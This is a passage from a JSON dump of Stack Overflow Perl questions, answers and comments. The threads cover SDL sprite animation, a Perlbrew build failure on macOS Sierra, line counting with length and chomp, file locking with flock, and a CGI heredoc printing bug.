last column, <code>312/6=52</code>, far from 47 that you claimed. Also your step_y is 1 when it should be 0.</p>\n"}], "owner": {"reputation": 21, "user_id": 7293586, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33e199b9b4da51be23e674ca6308b248?s=128&d=identicon&r=PG&f=1", "display_name": "RickNMorty", "link": "https://stackoverflow.com/users/7293586/ricknmorty"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 122, "favorite_count": 1, "answer_count": 1, "score": 2, "last_activity_date": 1485492189, "creation_date": 1485452327, "last_edit_date": 1485453817, "question_id": 41879579, "link": "https://stackoverflow.com/questions/41879579/how-to-correctly-move-a-sprite-image-in-sdl-perl", "title": "How to correctly move a sprite image in SDL Perl", "body": "<p>So i have created a sprite animation using SDL Perl, the good news is the sprite image is moving and the bad news is that the moving sprite is not exactly aligned in an 47x47 <code>SDLx::Rect</code> <br /></p>\n\n<p>I can't really explain what's going on so here's the screenshot</p>\n\n<p><a href=\"https://i.stack.imgur.com/hmPsg.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/hmPsg.png\" alt=\"enter image description here\"></a></p>\n\n<p>And here's the Sprite image i used</p>\n\n<p><a href=\"https://i.stack.imgur.com/kmApX.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/kmApX.png\" alt=\"enter image description here\"></a></p>\n\n<p>And finally my code:</p>\n\n<pre><code>use strict;\nuse warnings;\n\nuse SDLx::Sprite::Animated;\nuse SDL;\nuse SDLx::App;\nuse SDL::Rect;\n\nmy $anim = SDLx::Sprite::Animated-&gt;new(\n    image =&gt; \"ex.png\",\n    step_x =&gt; 47,\n    step_y =&gt; 1,\n    rect =&gt; SDL::Rect-&gt;new(0,0,47,47),\n    ticks_per_frame =&gt; 6,\n    type =&gt; \"circular\",\n);\n$anim-&gt;step_y(0);\n$anim-&gt;start();\n\nmy $app = SDLx::App-&gt;new( dt=&gt;0.02, exit_on_quit =&gt; 1, w=&gt; 200, h =&gt; 200 );\n$app-&gt;add_show_handler(\n    sub{\n        my ($step,$app) = @_;\n        $app-&gt;draw_rect([0,0,$app-&gt;w,$app-&gt;h],0);\n        $anim-&gt;draw($app-&gt;surface);\n        $app-&gt;update();\n        $app-&gt;delay(2);\n    }\n);\n\n$app-&gt;run();\n</code></pre>\n\n<p>Need your help, Thanks!</p>\n"}, {"tags": ["perl", "macos-sierra", "perlbrew"], "answers": [{"comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1485451151, "post_id": 41878505, "comment_id": 70940380, "body": "While this is technically correct, there is no 5.26.0 yet. The most current dev release at the moment is 5.25.9. We don&#39;t know if the patch will still be there in 5.26.0."}, {"owner": {"reputation": 13397, "user_id": 387981, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/eaaa20d03b637e0278e2541a952606e1?s=128&d=identicon&r=PG", "display_name": "Matteo", "link": "https://stackoverflow.com/users/387981/matteo"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485451638, "post_id": 41878505, "comment_id": 70940672, "body": "Sorry I did some typing errors. As far as I can remember it should be fixed in 5.24.2"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1485452318, "post_id": 41878505, "comment_id": 70941082, "body": "It&#39;s fixed in blead (the future 5.26.0), which is not the same as 5.24.2. According to that ticket, the fix has not been backported to the 5.24 branch, which is why ikegami edited your answer; &quot;the bug is solved for the not yet released 5.24.2&quot; is not true."}, {"owner": {"reputation": 13397, "user_id": 387981, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/eaaa20d03b637e0278e2541a952606e1?s=128&d=identicon&r=PG", "display_name": "Matteo", "link": "https://stackoverflow.com/users/387981/matteo"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1485501669, "post_id": 41878505, "comment_id": 70959574, "body": "@ikegami Sorry I edited my post without seeing your edits. I reverted my last edit."}, {"owner": {"reputation": 31, "user_id": 7474484, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e34d305577e6be2a0c8f556a0e6c22b5?s=128&d=identicon&r=PG&f=1", "display_name": "Alan Hudson", "link": "https://stackoverflow.com/users/7474484/alan-hudson"}, "edited": false, "score": 0, "creation_date": 1485516458, "post_id": 41878505, "comment_id": 70967710, "body": "Excellent. Thank you all for your help"}], "tags": [], "owner": {"reputation": 13397, "user_id": 387981, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/eaaa20d03b637e0278e2541a952606e1?s=128&d=identicon&r=PG", "display_name": "Matteo", "link": "https://stackoverflow.com/users/387981/matteo"}, "is_accepted": false, "score": 3, "last_activity_date": 1485501644, "last_edit_date": 1485501644, "creation_date": 1485448761, "answer_id": 41878505, "question_id": 41877766, "link": "https://stackoverflow.com/questions/41877766/perl-installing-with-perlbrew-on-macos-sierra/41878505#41878505", "title": "Perl: installing with Perlbrew on Macos Sierra", "body": "<p>You are not the only one: it's a bug. See <a href=\"https://rt.perl.org/Public/Bug/Display.html?id=128972\" rel=\"nofollow noreferrer\">Bug #128972 for perl5: Build failure on OS X 10.12 Sierra</a></p>\n\n<p>It seems that the bug is solved for 5.26.0, but not (yet) back-ported to 5.24.2 and 5.22.4.</p>\n\n<p>You could try with the bleeding-edge version (but that could very well have other problems):</p>\n\n<pre><code>perlbrew install perl-blead\n</code></pre>\n"}], "owner": {"reputation": 31, "user_id": 7474484, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e34d305577e6be2a0c8f556a0e6c22b5?s=128&d=identicon&r=PG&f=1", "display_name": "Alan Hudson", "link": "https://stackoverflow.com/users/7474484/alan-hudson"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1385, "favorite_count": 1, "answer_count": 1, "score": 3, "last_activity_date": 1485501644, "creation_date": 1485446723, "last_edit_date": 1485448883, "question_id": 41877766, "link": "https://stackoverflow.com/questions/41877766/perl-installing-with-perlbrew-on-macos-sierra", "title": "Perl: installing with Perlbrew on Macos Sierra", "body": "<p>I am attempting to use the lastest version of Perlbrew to install the latest stable version of Perl (5.24.1) with multi-threading on a computer running macOS-Sierra.</p>\n\n<p>Perlbrew appears to be installed correctly but when I run the command:</p>\n\n<pre><code>Perlbrew install perl-5.24.1 --thread or\nperlbrew install stable --thread\n</code></pre>\n\n<p>The installation proceeds but then fails with the following message</p>\n\n<pre><code>Installation process failed. To spot any issues, check\n\n  /Users/alan/perl5/perlbrew/build.perl-5.24.1.log\n\nIf some perl tests failed and you still want to install this distribution anyway,\ndo:\n\n  (cd /Users/alan/perl5/perlbrew/build/perl-5.24.1; make install)\n\nYou might also want to try upgrading patchperl before trying again:\n</code></pre>\n\n<p>Looking at the log file as suggested above I find the following error messages at the end of the file:</p>\n\n<pre><code>1 error generated.\nmake[1]: *** [HiRes.o] Error 1\ncc -c   -fno-common -DPERL_DARWIN -fno-strict-aliasing -pipe -fstack- protector-strong -I/usr/local/include -Wall -Werror=declaration-after-statement -Wextra -Wc++-compat -Wwrite-strings -Wthread-safety -O3 -DVERSION=\\\"1.9733\\\" -DXS_VERSION=\\\"1.9733\\\"  \"-I../..\"  -DTIME_HIRES_NANOSLEEP -DTIME_HIRES_CLOCK_GETTIME -DTIME_HIRES_CLOCK_GETRES -DTIME_HIRES_CLOCK_NANOSLEEP -DTIME_HIRES_CLOCK -DTIME_HIRES_STAT=1 -DATLEASTFIVEOHOHFIVE HiRes.c\nHiRes.xs:945:15: error: use of undeclared identifier 'darwin_time_mutex'\nMUTEX_INIT(&amp;darwin_time_mutex);\n          ^\n1 error generated.\nmake[1]: *** [HiRes.o] Error 1\nUnsuccessful make(dist/Time-HiRes): code=512 at make_ext.pl line 569.\nmake: *** [lib/auto/Time/HiRes/HiRes.bundle] Error 25\n##### Brew Failed #####\"\n</code></pre>\n\n<p>At other points in the log file, the following message appears several times too (although I have no idea how relevant this is to the failed installation process):</p>\n\n<pre><code>ld: warning: object file (xxxxxxxx) was built for newer OSX version (10.12) than being linked (10.4)\n</code></pre>\n\n<p>I have searched for similar problems on the web and found nothing close. I therefore wondering if this is a general issue with Perlbrew and Sierra or whether it is specific to my setup.</p>\n\n<p>Obviously I am beginner at programming and programming in Perl especially so please keep any responses as simple as possible</p>\n\n<p>Thanks for any help</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 10419, "user_id": 1151724, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/q6fMI.jpg?s=128&g=1", "display_name": "CodeClown42", "link": "https://stackoverflow.com/users/1151724/codeclown42"}, "edited": false, "score": 1, "creation_date": 1485447051, "post_id": 41980766, "comment_id": 71139039, "body": "<a href=\"http://perldoc.perl.org/functions/length.html\" rel=\"nofollow noreferrer\">perldoc.perl.org/functions/length.html</a>"}, {"owner": {"reputation": 820, "user_id": 4957508, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-wBY-4a1-0jo/AAAAAAAAAAI/AAAAAAAAAfc/4BCoMMK1rqg/photo.jpg?sz=128", "display_name": "Jeff Schaller", "link": "https://stackoverflow.com/users/4957508/jeff-schaller"}, "edited": false, "score": 5, "creation_date": 1485447940, "post_id": 41980766, "comment_id": 71139040, "body": "you might clarify with your teacher whether a newline character is a &quot;character&quot;, since chomp will remove it..."}], "answers": [{"tags": [], "owner": {"reputation": 586, "user_id": 5216673, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cb5d8b8e0713574ae9a4836651a39e56?s=128&d=identicon&r=PG", "display_name": "thrig", "link": "https://stackoverflow.com/users/5216673/thrig"}, "is_accepted": true, "score": 1, "last_activity_date": 1485448897, "creation_date": 1485448897, "answer_id": 41980767, "question_id": 41980766, "link": "https://stackoverflow.com/questions/41980766/how-to-use-the-length-function-in-a-while-loop-perl/41980767#41980767", "title": "How to use the length function in a while loop? (Perl)", "body": "<pre><code>#!/usr/bin/env perl\nuse strict;\nuse warnings;\n\nmy ( $length_with_nl, $length_without );\nopen my $seq, '&lt;', \"L2seq1.txt\" or die \"could not open L2seq1.txt: $!\\n\";\nwhile ( readline $seq ) {\n    $length_with_nl += length;\n    chomp;\n    $length_without += length;\n}\nmy $lines = $.;\nclose $seq;\nprint \"lines $lines lwn $length_with_nl lwout $length_without\\n\";\n</code></pre>\n"}], "migrated_from": {"other_site": {"aliases": ["http://linux.stackexchange.com"], "markdown_extensions": ["Prettify"], "launch_date": 1294871917, "open_beta_date": 1282071600, "closed_beta_date": 1281466800, "site_state": "normal", "high_resolution_icon_url": "https://cdn.sstatic.net/Sites/unix/Img/apple-touch-icon@2.png", "favicon_url": "https://cdn.sstatic.net/Sites/unix/Img/favicon.ico", "icon_url": "https://cdn.sstatic.net/Sites/unix/Img/apple-touch-icon.png", "audience": "users of Linux, FreeBSD and other Un*x-like operating systems", "site_url": "https://unix.stackexchange.com", "api_site_parameter": "unix", "logo_url": "https://cdn.sstatic.net/Sites/unix/Img/logo.png", "name": "Unix &amp; Linux", "site_type": "main_site"}, "on_date": 1485954903, "question_id": 340336}, "owner": {"reputation": 9, "user_id": 7501113, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/LVWBG.jpg?s=128&g=1", "display_name": "Daniela Bustamante", "link": "https://stackoverflow.com/users/7501113/daniela-bustamante"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 59, "favorite_count": 0, "accepted_answer_id": 41980767, "answer_count": 1, "score": 0, "last_activity_date": 1485954903, "creation_date": 1485446459, "question_id": 41980766, "link": "https://stackoverflow.com/questions/41980766/how-to-use-the-length-function-in-a-while-loop-perl", "title": "How to use the length function in a while loop? (Perl)", "body": "<p>I'm just working on a school assignment which is asking me to modify the following loop in order to get the number of lines and characters in \"L2seq1.txt\" I'm supposed to do this by using the length function and also include chomp. \nI am however very new at this and having some trouble so I would greatly appreciate your help.\nThank you!</p>\n\n<pre><code>open(SEQ, \"&lt;\", \"L2seq1.txt\") or die;\nwhile (my $line = &lt;SEQ&gt;) {\nprint $line;   \n}\nclose SEQ or die;\n</code></pre>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 15906, "user_id": 3527940, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/k1R45.jpg?s=128&g=1", "display_name": "jcaron", "link": "https://stackoverflow.com/users/3527940/jcaron"}, "edited": false, "score": 3, "creation_date": 1485432216, "post_id": 41872872, "comment_id": 70927632, "body": "It&#39;s probably better for readability if you use the named constants instead of &quot;2&quot; in you <code>flock</code> call. Also you probably want to have default value for <code>$ENV{TEMP}</code>, and check that your <code>open</code> is successful. You probably want to check the return value of <code>flock</code> as well."}, {"owner": {"reputation": 930, "user_id": 6594367, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/03c046cae270605c2376680482e52f6d?s=128&d=identicon&r=PG&f=1", "display_name": "John Doe", "link": "https://stackoverflow.com/users/6594367/john-doe"}, "reply_to_user": {"reputation": 15906, "user_id": 3527940, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/k1R45.jpg?s=128&g=1", "display_name": "jcaron", "link": "https://stackoverflow.com/users/3527940/jcaron"}, "edited": false, "score": 0, "creation_date": 1485433966, "post_id": 41872872, "comment_id": 70928583, "body": "@jcaron You are right, thanks for the suggestions, I am using explicit constants name, also treating the exceptions which may occur while opening or locking the file."}], "answers": [{"comments": [{"owner": {"reputation": 930, "user_id": 6594367, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/03c046cae270605c2376680482e52f6d?s=128&d=identicon&r=PG&f=1", "display_name": "John Doe", "link": "https://stackoverflow.com/users/6594367/john-doe"}, "edited": false, "score": 0, "creation_date": 1485432727, "post_id": 41873001, "comment_id": 70927922, "body": "You are right, I am checking afterwards if the component was already installed by another script."}, {"owner": {"reputation": 930, "user_id": 6594367, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/03c046cae270605c2376680482e52f6d?s=128&d=identicon&r=PG&f=1", "display_name": "John Doe", "link": "https://stackoverflow.com/users/6594367/john-doe"}, "edited": false, "score": 0, "creation_date": 1485432947, "post_id": 41873001, "comment_id": 70928046, "body": "This is the only concern which I had, if the lock affects or not the <code>open</code> function"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 930, "user_id": 6594367, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/03c046cae270605c2376680482e52f6d?s=128&d=identicon&r=PG&f=1", "display_name": "John Doe", "link": "https://stackoverflow.com/users/6594367/john-doe"}, "edited": false, "score": 0, "creation_date": 1485435446, "post_id": 41873001, "comment_id": 70929411, "body": "@JohnDoe: You could just <a href=\"http://perldoc.perl.org/functions/flock.html\" rel=\"nofollow noreferrer\">read about it</a>"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1485435527, "post_id": 41873001, "comment_id": 70929455, "body": "@Sobrique: I would add that calls to <code>flock</code> shouldn&#39;t be made using <i>magic numbers</i>, and that <code>use Fcntl &#39;:flock&#39;</code> provides some useful identifiers for the constants that may need to be passed."}, {"owner": {"reputation": 930, "user_id": 6594367, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/03c046cae270605c2376680482e52f6d?s=128&d=identicon&r=PG&f=1", "display_name": "John Doe", "link": "https://stackoverflow.com/users/6594367/john-doe"}, "edited": false, "score": 0, "creation_date": 1485438790, "post_id": 41873001, "comment_id": 70931638, "body": "About last point, I intentionately use a blocking lock. Because each script needs to use later the component which it installs. And if 2 scripts are trying to install the same component, first one runs and starts the installation, the second comes and finds the file locked. If it skips, it will try to access the component which isn&#39;t installed yet by the first script. With the blocking lock, I&#39;m creating a &quot;queue&quot; a-like system."}, {"owner": {"reputation": 930, "user_id": 6594367, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/03c046cae270605c2376680482e52f6d?s=128&d=identicon&r=PG&f=1", "display_name": "John Doe", "link": "https://stackoverflow.com/users/6594367/john-doe"}, "edited": false, "score": 0, "creation_date": 1485438973, "post_id": 41873001, "comment_id": 70931750, "body": "Also, thank you for the style improvements suggestions. They are really helpfull and I will defently implement them."}], "tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": true, "score": 4, "last_activity_date": 1485436854, "last_edit_date": 1485436854, "creation_date": 1485432088, "answer_id": 41873001, "question_id": 41872872, "link": "https://stackoverflow.com/questions/41872872/synchronize-processes-by-locking-a-file/41873001#41873001", "title": "Synchronize processes by locking a file", "body": "<p>The thing that's important to remember is - the 'open' will work in either case, because that doesn't test the lock. It's the <code>flock</code> operation that will block until the lock is released. </p>\n\n<p>And this should work just fine, although once the lock <em>is</em> released - you might want to check if you still need to run the install, unless you don't really care about doing it twice - e.g. if the rest of the script makes use of/relies upon it. </p>\n\n<p>Also - are there other sources of 'installing' that aren't your script, that could cause the same problem? A lock is an advisory thing. </p>\n\n<p>It would be a style improvement in your program to also:</p>\n\n<ul>\n<li>Test <code>$ENV{'TEMP'}</code> to see that it exists, and default (or fail) if it doesn't. </li>\n<li><code>use Fcntl qw ( :flock );</code> because then you can <code>flock ( $fh, LOCK_EX );</code> to make it clear you're taking an exclusive lock. </li>\n<li>You appear to be using <code>\\\\</code> as a file separator. That's probably better if you used something like <a href=\"http://perldoc.perl.org/File/Spec.html\" rel=\"nofollow noreferrer\"><code>File::Spec</code></a> to do that, for portability reasons. </li>\n<li>You can use a <code>LOCK_NB</code> for nonblocking: <code>flock ( $fh, LOCK_EX | LOCK_NB )</code> and then just skip if it's locked. </li>\n</ul>\n"}, {"comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 1, "creation_date": 1485502093, "post_id": 41877741, "comment_id": 70959803, "body": "Great, thank you.  So I <i>can</i> open a file first and then wait, with <code>sysopen</code>.  I take it that then the <code>open</code> for reading is fine (then wait)."}, {"owner": {"reputation": 930, "user_id": 6594367, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/03c046cae270605c2376680482e52f6d?s=128&d=identicon&r=PG&f=1", "display_name": "John Doe", "link": "https://stackoverflow.com/users/6594367/john-doe"}, "edited": false, "score": 0, "creation_date": 1485520550, "post_id": 41877741, "comment_id": 70970056, "body": "Thanks for the answer, very good explanation! I will ignore the clobber  issue because it isn&#39;t the important piece in my algorithm. The important part is to synchronize the installations, the file is just a pawn in this chess game. I use it just as a flag. While it is locked, don&#39;t do any installation. If the file isn&#39;t lock, then I can install."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1485539760, "post_id": 41877741, "comment_id": 70982569, "body": "Ah yes. I&#39;ll add a comment about that to my answer."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 2, "last_activity_date": 1485539826, "last_edit_date": 1485539826, "creation_date": 1485446646, "answer_id": 41877741, "question_id": 41872872, "link": "https://stackoverflow.com/questions/41872872/synchronize-processes-by-locking-a-file/41877741#41877741", "title": "Synchronize processes by locking a file", "body": "<p>A lock doesn't prevent the file from being opened or modified; it prevents it from being locked.</p>\n\n<p>This means the <code>open</code> won't fail, and it will clobber the file even if it's locked and still being used. If the lock is meant to protect access to the file (i.e. if the programs actually write to the locked file), you want to use <code>sysopen</code> to avoid clobbering the file if it already exists<sup>[1]</sup>.</p>\n\n<pre><code>use Fcntl qw( LOCK_EX O_CREAT O_WRONLY );\n\n# Open the file without clobbering it, creating it if necessary.\nsysopen(my $fh, $qfn, O_WRONLY | O_CREAT)\n   or die($!);\n\n# Wait for the file to become available.\nflock($fh, LOCK_EX)\n   or die($!);\n\ntruncate($fh, 0)\n   or die($!);\n\n...\n</code></pre>\n\n<p>or</p>\n\n<pre><code>use Fcntl qw( LOCK_EX LOCK_NB O_CREAT O_WRONLY );\n\n# Open the file without clobbering it, creating it if necessary.\nsysopen(my $fh, $qfn, O_WRONLY | O_CREAT)\n   or die($!);\n\n# Check if the file is locked.\nflock($fh, LOCK_EX | LOCK_NB)\n   or die($!{EWOULDBLOCK} ? \"File already in use\\n\" : $!);\n\ntruncate($fh, 0)\n   or die($!);\n\n...\n</code></pre>\n\n<hr>\n\n<ol>\n<li>You could also use <code>open(my $fh, '&gt;&gt;', $qfn)</code> if you don't mind having the file in append mode.</li>\n</ol>\n"}], "owner": {"reputation": 930, "user_id": 6594367, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/03c046cae270605c2376680482e52f6d?s=128&d=identicon&r=PG&f=1", "display_name": "John Doe", "link": "https://stackoverflow.com/users/6594367/john-doe"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 534, "favorite_count": 1, "accepted_answer_id": 41873001, "answer_count": 2, "score": 3, "last_activity_date": 1485539826, "creation_date": 1485431564, "last_edit_date": 1485436421, "question_id": 41872872, "link": "https://stackoverflow.com/questions/41872872/synchronize-processes-by-locking-a-file", "title": "Synchronize processes by locking a file", "body": "<p>One of my scripts is installing a component. When run in parallel, the same script tries to install the same component, so I thought about synchronizing the process by locking a file while the script is installing and wait while other script is installing something.</p>\n\n<p>The code would look like this:</p>\n\n<pre><code># this will create a file handler on a file from TEMP dir with the\n# name of the component; if it doesn't exist in TEMP dir, it will create it\n\nmy $file = $ENV{\"TEMP\"}. \"\\\\\" . $componentName;\nopen (my $fh, \"&gt;\", \"$file\") or die \"Couldn't open file!\";\n\n# this will apply an exclusive lock  meaning that if another process\n# already locked the file, it will wait until the lock is removed\n\nflock($fh, 2) or die \"Failed to lock the file\";\n\n# install the component..\n\n# closing the file handle automatically removes the lock\nclose $fh;\n</code></pre>\n\n<p>I am concerned about the situation when a script locks the file and is starting the installation and the second script comes and tries to create a file handle on the locked file. I didn't see any errors, but I don't want to miss something. </p>\n\n<p>Will there be a problem with this?</p>\n"}, {"tags": ["html", "css", "perl", "cgi"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1485431429, "post_id": 41872480, "comment_id": 70927195, "body": "You probably believe you are simplifying the code for us by using <code>bananas</code> all over the place, but in fact you have made it more awkward to read. When <i>every</i> variable contains <code>bananas</code> it doesn&#39;t provide any information, and should be deleted everywhere."}], "answers": [{"comments": [{"owner": {"reputation": 350, "user_id": 5243363, "user_type": "registered", "accept_rate": 44, "profile_image": "https://i.stack.imgur.com/koXar.jpg?s=128&g=1", "display_name": "Ch&#252;ngel", "link": "https://stackoverflow.com/users/5243363/ch%c3%bcngel"}, "edited": false, "score": 0, "creation_date": 1485442014, "post_id": 41872730, "comment_id": 70933855, "body": "Hi @Borodin, thanks, I&#39;m learning! I&#39;m having an error now &quot;Can&#39;t find string terminator &quot;END_HTML&quot; anywhere before EOF&quot; am I missing something?"}, {"owner": {"reputation": 82895, "user_id": 372239, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/2twLb.jpg?s=128&g=1", "display_name": "Toto", "link": "https://stackoverflow.com/users/372239/toto"}, "reply_to_user": {"reputation": 350, "user_id": 5243363, "user_type": "registered", "accept_rate": 44, "profile_image": "https://i.stack.imgur.com/koXar.jpg?s=128&g=1", "display_name": "Ch&#252;ngel", "link": "https://stackoverflow.com/users/5243363/ch%c3%bcngel"}, "edited": false, "score": 0, "creation_date": 1485442413, "post_id": 41872730, "comment_id": 70934198, "body": "@Ch&#252;ngel: Make sure you don&#39;t have a space at the end of <code>END_HTML</code>"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 350, "user_id": 5243363, "user_type": "registered", "accept_rate": 44, "profile_image": "https://i.stack.imgur.com/koXar.jpg?s=128&g=1", "display_name": "Ch&#252;ngel", "link": "https://stackoverflow.com/users/5243363/ch%c3%bcngel"}, "edited": false, "score": 0, "creation_date": 1485442585, "post_id": 41872730, "comment_id": 70934343, "body": "@Ch&#252;ngel: Yes, there must be no spaces before or after <code>END_HTML</code>. It&#39;s a restriction that should be relaxed on near-future Perl 5 releases."}, {"owner": {"reputation": 350, "user_id": 5243363, "user_type": "registered", "accept_rate": 44, "profile_image": "https://i.stack.imgur.com/koXar.jpg?s=128&g=1", "display_name": "Ch&#252;ngel", "link": "https://stackoverflow.com/users/5243363/ch%c3%bcngel"}, "edited": false, "score": 0, "creation_date": 1485444409, "post_id": 41872730, "comment_id": 70935739, "body": "Thanks guys, double quotes mentioned in this post: [link] (<a href=\"http://stackoverflow.com/questions/37383898/getting-error-in-perl-cant-find-string-terminator-eof-anywhere-before-eof-at\" title=\"getting error in perl cant find string terminator eof anywhere before eof at\">stackoverflow.com/questions/37383898/&hellip;</a>) + this post + the spaces solved the issue"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 350, "user_id": 5243363, "user_type": "registered", "accept_rate": 44, "profile_image": "https://i.stack.imgur.com/koXar.jpg?s=128&g=1", "display_name": "Ch&#252;ngel", "link": "https://stackoverflow.com/users/5243363/ch%c3%bcngel"}, "edited": false, "score": 0, "creation_date": 1485445225, "post_id": 41872730, "comment_id": 70936362, "body": "@Ch&#252;ngel: I&#39;m pleased you have sorted it out. <code>print &lt;&lt; &quot;XXX&quot;</code> is the same as <code>print &lt;&lt;&lt;XXX</code> except that you may put spaces after the <code>&lt;&lt;</code>. <code>print &lt;&lt; &#39;XXX&#39;</code> works like a single-quoted string and won&#39;t interpolate any variables. In all cases there must be <i>exactly</i> the same spaces before and after the <code>XXX</code> as there are on the closing line, so the easiest option is none at all."}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": true, "score": 3, "last_activity_date": 1485438751, "last_edit_date": 1485438751, "creation_date": 1485431013, "answer_id": 41872730, "question_id": 41872480, "link": "https://stackoverflow.com/questions/41872480/perl-variables-order-of-execution/41872730#41872730", "title": "Perl variables order of execution", "body": "<p>You <strong><em>must always</em></strong> <code>use strict</code> and <code>use warnings 'all'</code> at the top of <em>every</em> Perl program that you write. It would have been a lot of help to you with this question</p>\n\n<p>The problem is that this</p>\n\n<pre><code>my $bananas = print \"&lt;tr&gt;\n    &lt;td&gt;$happyBananas[0]&lt;/td&gt;\n    &lt;td&gt;$hippieBananas[1]&lt;/td&gt;\n&lt;/tr&gt;\";\n</code></pre>\n\n<p>will immediately print the table row, set the lexical variable <code>$bananas</code> to 1 (the return code of <code>print</code>) and then throw it away at the end of the loop</p>\n\n<p>You want something like this instead, which accumulates the contents of the table into <em>non-local</em> variable 